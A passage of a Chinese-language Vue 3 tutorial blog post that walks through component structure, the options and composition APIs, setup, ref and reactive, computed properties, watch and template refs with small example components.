class="line"></span><br><span class="line">import &#x27;./assets/main.css&#x27;// 引入根组件 App.vue</span><br><span class="line">import &#123; createApp &#125; from &#x27;vue&#x27;     //引入 Vue 3 的 createApp 函数</span><br><span class="line">import App from &#x27;./App.vue&#x27;         //引入根组件 App</span><br><span class="line">createApp(App).mount(&#x27;#app&#x27;)        // 创建应用实例并挂载到 #app 元素</span><br></pre></td></tr></table></figure><p><code>.vue</code>文件可以由<code>模板</code>、<code>脚本</code>和<code>样式</code>三部分组成。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// 模板部分</span><br><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;app&quot;&gt;//类名为app的组件容器</span><br><span class="line">        &lt;h1&gt;泥嚎：&lt;/h1&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">//脚本部分</span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;App&#x27;//导出对象，为组件命名</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">//样式部分</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.app &#123;//对 app 类的 CSS 类选择器。这个块中的样式将应用于类为 app 的 div 元素。</span><br><span class="line">    background-color: #0b1581;//颜色</span><br><span class="line">    box-shadow: 0 0 10px;//阴影的偏移和模糊半径</span><br><span class="line">    border-radius: 10px;//角半径，即边角圆滑程度</span><br><span class="line">    padding: 20px;//边框范围</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="选项式API与组合式API"><a href="#选项式API与组合式API" class="headerlink" title="选项式API与组合式API"></a>选项式API与组合式API</h3><ul><li><p><code>选项式API</code>，将不同组件的一部分逻辑都放在对应的选项对象中</p><ul><li><code>data</code>：返回一个响应式数据对象，通常包含组件的状态。</li><li><code>methods</code>：定义方法，这些方法可以包含函数，它们在组件内部被调用。</li><li><code>computed</code>：定义计算属性，它们基于其他响应式数据计算并返回值。</li><li><code>watch</code>：定义观察者，它们在响应式数据变化时被触发。</li></ul></li><li><p><code>选项式 API</code>更适合简单的组件，特别是对于那些不需要复杂逻辑和状态管理的组件。</p></li><li><code>组合式 API</code> 更适合复杂的组件，特别是那些需要更细粒度的逻辑管理和状态管理的组件。</li></ul><h3 id="选项式API"><a href="#选项式API" class="headerlink" title="选项式API"></a>选项式API</h3><p>在刚刚定义的组件添加一个子组件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">        &lt;h1&gt;泥嚎：&lt;/h1&gt;</span><br><span class="line">        &lt;person/&gt;//添加子组件</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">import Person from &#x27;./components/Person.vue&#x27;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;App&#x27;,</span><br><span class="line">    components: &#123;// 注册了一个名为Person的组件</span><br><span class="line">        Person</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">.app &#123;</span><br><span class="line">    background-color: #237849;</span><br><span class="line">    box-shadow: 0 0 10px;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">    padding: 20px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="组合式API"><a href="#组合式API" class="headerlink" title="组合式API"></a>组合式API</h3><h3 id="setup"><a href="#setup" class="headerlink" title="setup"></a>setup</h3><p>将一个组件的不同逻辑功能放入一个setup()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">        &lt;h1&gt;姓名： &#123;&#123; name &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;年龄： &#123;&#123; age &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;手机号： &#123;&#123; tel &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;button @click=&quot;changename&quot;&gt;&gt;点击修改姓名&lt;/button&gt;</span><br><span class="line">        &lt;button @mousemove=&quot;changeage&quot;&gt;&gt;点击修改年龄&lt;/button&gt;</span><br><span class="line">        &lt;button @click=&quot;showTel&quot;&gt;&gt;点击查看联系方式&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;Person&#x27;,</span><br><span class="line">    setup() &#123;</span><br><span class="line">        //都未定义为响应式数据</span><br><span class="line">        let name = &#x27;Randolfluo&#x27;;</span><br><span class="line">        let age = 20;</span><br><span class="line">        let tel = &#x27;123456789&#x27;;</span><br><span class="line"></span><br><span class="line">        function changename()   //不起作用，因为不是响应式数据</span><br><span class="line">        &#123;</span><br><span class="line">            name = &#x27;miku&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        function changeage()     //不起作用，因为不是响应式数据</span><br><span class="line">        &#123;</span><br><span class="line">            age += 1;</span><br><span class="line">        &#125;</span><br><span class="line">        function showTel()      //起作用，因为未作修改</span><br><span class="line">        &#123;</span><br><span class="line">            alert(tel);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return &#123; name, age, tel, changename, changeage, showTel &#125;</span><br><span class="line">        //setup返回值，可以是渲染函数</span><br><span class="line">        //return()=&gt; &quot;114514&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">.person &#123;</span><br><span class="line">    background-color: #e0eee7;</span><br><span class="line">    box-shadow: 0 0 10px;</span><br><span class="line">    border-radius: 10px;</span><br><span class="line">    padding: 20px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">button &#123;</span><br><span class="line">    background-color: rgb(160, 183, 212);</span><br><span class="line"></span><br><span class="line">    border-radius: 1000px;</span><br><span class="line">    margin: 0 10px;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="setup语法糖"><a href="#setup语法糖" class="headerlink" title="setup语法糖"></a>setup语法糖</h3><p>我们可以将<code>setup</code>单独放入一个<code>script</code>标签，直接返回该标签内所有元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;Person&#x27;</span><br><span class="line">&#125;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line"></span><br><span class="line">let name = &#x27;Randolfluo&#x27;;</span><br><span class="line">let age = 20;</span><br><span class="line">let tel = &#x27;123456789&#x27;;</span><br><span class="line"></span><br><span class="line">function changename()   //不起作用，因为不是响应式数据</span><br><span class="line">&#123;</span><br><span class="line">    name = &#x27;miku&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">function changeage()     //不起作用，因为不是响应式数据</span><br><span class="line">&#123;</span><br><span class="line">    age += 1;</span><br><span class="line">&#125;</span><br><span class="line">function showTel()      //起作用，因为未作修改</span><br><span class="line">&#123;</span><br><span class="line">    alert(tel);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="ref-amp-reactive"><a href="#ref-amp-reactive" class="headerlink" title="ref&amp;reactive"></a>ref&amp;reactive</h3><ul><li><p>一般ref即可解决问题</p></li><li><p>ref   可以定义基本数据类型的响应式数据和对象类型的响应式数据</p><ul><li><p>ref定义对象类型的响应式数据的_value是proxy()</p></li><li><p>ref直接指向新的对象</p></li></ul></li><li><p>reactive    只能定义对象类型的响应式数据</p><ul><li><p>重新分配的对象会变成普通对象 </p></li><li><p>Vue 3 的响应式系统是基于 Proxy 的，这意味着每个响应式对象都有一个唯一的 Proxy 实例。即重新赋值一个响应式对象时，你实际上是在创建一个新的响应式对象，而不是更新原始对象。vue视图没有跟踪数据块修改。</p></li><li><p>可以通过<code>Object.assign(object,对象类型的具体属性)</code>修改对象的值。</p></li></ul></li><li><p><code>Proxy</code> 是一个构造函数，它允许你创建一个对象的代理，从而可以控制对这个对象的访问。</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">        &lt;h1&gt;姓名： &#123;&#123; user.username &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;年龄： &#123;&#123; user.age &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;h1&gt;手机号： &#123;&#123; user.tel &#125;&#125;&lt;/h1&gt;</span><br><span class="line">        &lt;button @click=&quot;changeage&quot;&gt;&gt;点击修改年龄&lt;/button&gt;</span><br><span class="line">        &lt;h1&gt;game:&lt;/h1&gt;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &lt;li v-for=&quot;g in game&quot; :key=&quot;g.id&quot;&gt;&#123;&#123; g.name &#125;&#125;&lt;/li&gt;</span><br><span class="line"> //v-for 指令用于基于一个数组渲染列表。当数组中的对象发生变化时，Vue 会自动更新列表中的元素。</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">        &lt;button @click=&quot;yuanshenqidong&quot;&gt;&gt;点击启动！&lt;/button&gt;&quot;</span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;Person&#x27;</span><br><span class="line">&#125;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">import &#123; reactive, ref &#125; from &#x27;vue&#x27;;</span><br><span class="line"></span><br><span class="line">let user = reactive(&#123;</span><br><span class="line">    username: &#x27;Randolfluo&#x27;,</span><br><span class="line">    age: 20,</span><br><span class="line">    tel: &#x27;123456789&#x27;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">let game = ref([</span><br><span class="line">    &#123;id:&#x27;game1&#x27;, name:&#x27;red alarm&#x27;&#125;,</span><br><span class="line">    &#123;game2:&#x27;game2&#x27;, name:&#x27;warthunder&#x27;&#125;,</span><br><span class="line">    &#123;game3: &#x27;game3&#x27;, name:&#x27;MC&#x27;&#125;</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">function changeage() &#123;</span><br><span class="line">    user.age += 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function yuanshenqidong()&#123;</span><br><span class="line">    game.value.forEach(item =&gt; &#123;</span><br><span class="line">        item.name = &#x27;原神启动&#x27;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="toRefs与toRef"><a href="#toRefs与toRef" class="headerlink" title="toRefs与toRef"></a>toRefs与toRef</h3><ul><li>从响应式对象中提取响应式引用。<ul><li>toRefs引用整个对象</li><li>toRef引用对象元素</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">let person = reactive(&#123;</span><br><span class="line">name: &#x27;Randolfluo&#x27;,</span><br><span class="line">age : 20;</span><br><span class="line">&#125;)</span><br><span class="line">let&#123;name, age&#125; = toRefs(person)</span><br><span class="line">let ag = toRef(person,&#x27;age&#x27;)</span><br></pre></td></tr></table></figure><h4 id="compuuted计算属性"><a href="#compuuted计算属性" class="headerlink" title="compuuted计算属性"></a>compuuted计算属性</h4><ul><li><p><code>v-bind</code>单向绑定意味着数据只能从父组件流向子组件，而不能反向流动。</p></li><li><p><code>v-model</code>双向绑定意味着数据可以从父组件流向子组件，也可以从子组件反向流向父组件。</p></li><li><p>computed计算属性实际是ref定义的响应数据</p></li><li>默认computed是只读的缓存，我们可以添加<code>get</code>和<code>set</code>方法来返回和设置值实现读写权限。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">       firstname: &lt;input type=&quot;text&quot; v-model=&quot;firstname&quot;&gt; &lt;br&gt;</span><br><span class="line">       lastname: &lt;input type=&quot;text&quot; v-model=&quot;lastname&quot;&gt; &lt;br&gt;</span><br><span class="line">       &lt;button @click=&quot;Mikumiku&quot;&gt;我推的：&lt;/button&gt;  &lt;br&gt;</span><br><span class="line">       fullname: &lt;span&gt; &#123;&#123; fullname &#125;&#125;&lt;/span&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    name: &#x27;Person&#x27;</span><br><span class="line">&#125;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup&gt;</span><br><span class="line">import &#123;  ref,computed &#125; from &#x27;vue&#x27;;</span><br><span class="line">let firstname = ref(&#x27;randolf&#x27;);</span><br><span class="line">let lastname = ref(&#x27;luo&#x27;);</span><br><span class="line"></span><br><span class="line">// let fullname = computed(()=&gt;&#123;</span><br><span class="line">//     return firstname.value.slice(0,1).toUpperCase() + firstname.value.slice(1) + &#x27;-&#x27; + lastname.value;</span><br><span class="line">// &#125;);</span><br><span class="line"></span><br><span class="line">let fullname = computed(&#123;       </span><br><span class="line">    get()&#123;</span><br><span class="line">        return firstname.value.slice(0,1).toUpperCase() + firstname.value.slice(1) + &#x27;-&#x27; + lastname.value;</span><br><span class="line">    &#125;,</span><br><span class="line">    set(val)&#123;//Mikumiku函数修改触发set</span><br><span class="line">        const [str1, str2] = val.split(&#x27;-&#x27;);</span><br><span class="line">        firstname.value = str1;</span><br><span class="line">        lastname.value = str2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line">function Mikumiku()&#123;</span><br><span class="line">   fullname.value = &#x27;Hatsune-Miku&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="watch监视"><a href="#watch监视" class="headerlink" title="watch监视"></a>watch监视</h3><p><code>Vue3</code>中的<code>watch</code>只能监视以下<strong>四种数据</strong>：</p><ol><li><code>ref</code>定义的数据。</li><li><code>reactive</code>定义的数据。</li><li>函数返回一个值（<code>getter</code>函数）。</li><li>一个包含上述内容的数组。</li></ol><ul><li>watch的第一个参数是：被监视的数据</li><li>watch的第二个参数是：监视的回调</li><li><p>watch的第三个参数是：配置对象（deep、immediate等等…..） </p></li><li><p>情况一</p></li></ul><p>监视<code>ref</code>定义的【基本类型】数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">const stopWatch = watch(sum,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;sum变化了&#x27;,newValue,oldValue)</span><br><span class="line">    if(newValue &gt;= 10)&#123;</span><br><span class="line">      stopWatch()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>情况二</li></ul><p>监视<code>ref</code>定义的【对象类型】数据，监视的是对象的【地址值】，监视该对象的值需要开启深度监视(deep)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">watch(person,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br></pre></td></tr></table></figure><ul><li>情况三</li></ul><p>监视<code>reactive</code>定义的【对象类型】数据，默认开启了深度监视(隐式创建深层监听 )。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">watch(person,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">  console.log(&#x27;person变化了&#x27;,newValue,oldValue)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>情况四</li></ul><p>监视<code>ref</code>或<code>reactive</code>定义的【对象类型】数据中的<strong>某个属性</strong>，注意点如下：</p><ol><li>若该属性值<strong>不是</strong>【对象类型】，需要写成函数形式。</li><li>若该属性值是<strong>依然</strong>是【对象类型】，可直接编，也可写成函数，建议写成函数。</li></ol><p>结论：监视的要是对象里的属性，那么最好写函数式，注意点：若是对象监视的是地址值，需要关注对象内部，需要手动开启深度监视。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">watch(()=&gt; person.name,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">  console.log(&#x27;person.name变化了&#x27;,newValue,oldValue)</span><br><span class="line">&#125;) </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">watch(()=&gt;person.car,(newValue,oldValue)=&gt;&#123;</span><br><span class="line">  console.log(&#x27;person.car变化了&#x27;,newValue,oldValue)</span><br><span class="line">&#125;,&#123;deep:true&#125;)</span><br></pre></td></tr></table></figure><ul><li>情况五</li></ul><p>监视上述的多个数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">watch([()=&gt;person.name,person.car],(newValue,oldValue)=&gt;&#123;</span><br><span class="line">    console.log(&#x27;person.car变化了&#x27;,newValue,oldValue)</span><br><span class="line">  &#125;,&#123;deep:true&#125;)</span><br></pre></td></tr></table></figure><ul><li>watchEffect：立即运行一个函数，同时响应式地追踪其依赖，并在依赖更改时重新执行该函数。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const stopWtach = watchEffect(()=&gt;&#123;</span><br><span class="line">  // 室温达到50℃，或水位达到20cm，立刻联系服务器</span><br><span class="line">  if(temp.value &gt;= 50 || height.value &gt;= 20)&#123;</span><br><span class="line">    console.log(document.getElementById(&#x27;demo&#x27;)?.innerText)</span><br><span class="line">    console.log(&#x27;联系服务器&#x27;)</span><br><span class="line">  &#125;</span><br><span class="line">  // 水温达到100，或水位达到50，取消监视</span><br><span class="line">  if(temp.value === 100 || height.value === 50)&#123;</span><br><span class="line">    console.log(&#x27;清理了&#x27;)</span><br><span class="line">    stopWtach()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="标签的ref属性"><a href="#标签的ref属性" class="headerlink" title="标签的ref属性"></a>标签的ref属性</h3><p>为什么不用javascript引用标签</p><ul><li>因为一个页面不能有多个一样的id，但是可以存在多个相同的类 。若父类和子类定义相同的id，则锚点链接可能无法正确工作。</li></ul><p>作用：用于模板引用作用：用于注册模板引用。</p><p>类似于局部变量</p><p>局部样式：<style scoped>，<code>scoped</code>属性确保了样式只应用于当前组件，防止样式泄漏到其他组件。</p><blockquote><ul><li><p>用在普通<code>DOM</code>标签上，获取的是<code>DOM</code>节点。</p></li><li><p>用在组件标签上，获取的是组件实例对象。</p></li></ul></blockquote><p>用在普通<code>DOM</code>标签上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;person&quot;&gt;</span><br><span class="line">        &lt;h1 id = &quot;ref1&quot;&gt;Randolfluo&lt;/h1&gt;</span><br><span class="line">        &lt;h1 ref = &quot;ref2&quot;&gt;Hatsune Miku&lt;/h1&gt;</span><br><span class="line">        &lt;h1 ref = &quot;ref3&quot;&gt;原神&lt;/h1&gt;</span><br><span class="line">        &lt;button @click=&quot;ShowLog&quot;&gt;输出&lt;/button&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name = &quot;Person&quot;&gt;</span><br><span class="line">import &#123;ref, defineExpose&#125; from &#x27;vue&#x27;</span><br><span class="line">let ref1 = ref();   //存储标记内容</span><br><span class="line">let ref2 = ref();</span><br><span class="line">let ref3 = ref();</span><br><span class="line"></span><br><span class="line">function ShowLog()&#123;</span><br><span class="line">    console.log(document.getElementById(&quot;ref1&quot;) ); //获取具有特定标签名的所有元素</span><br><span class="line">    console.log(ref2.value);    // 输出 ref1 引用的 DOM 元素</span><br><span class="line">    alert(ref3.value.innerHTML);    // 输出 ref2 引用的 DOM 元素</span><br><span class="line">&#125;</span><br><span class="line">     </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>用在组件标签上：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">        &lt;h1&gt;泥嚎：&lt;/h1&gt;</span><br><span class="line">        &lt;button @click=&quot;Show&quot;&gt;输出&lt;/button&gt;</span><br><span class="line">        &lt;person ref = &quot;ren&quot;/&gt;   //子组件的属性</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script lang=&quot;ts&quot;, setup name = &quot;App&quot;&gt;</span><br><span class="line">import Person from &#x27;./components/Person.vue&#x27;;   //vue3写法，搭配setup</span><br><span class="line">// export default &#123;//vue不用额外写这些</span><br><span class="line">//     name: &#x27;App&#x27;,</span><br><span class="line">//     components: &#123;</span><br><span class="line">//         Person</span><br><span class="line">//     &#125;</span><br><span class="line">// &#125;</span><br><span class="line">import &#123;ref&#125; from &#x27;vue&#x27;</span><br><span class="line">let ren = ref();</span><br><span class="line">function Show()&#123;</span><br><span class="line">    console.log(ren.value);     //输出子组件</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">子组件</span><br><span class="line">&lt;script lang=&quot;ts&quot; setup name = &quot;Person&quot;&gt;</span><br><span class="line">defineExpose(&#123; ref2, ref3&#125;);    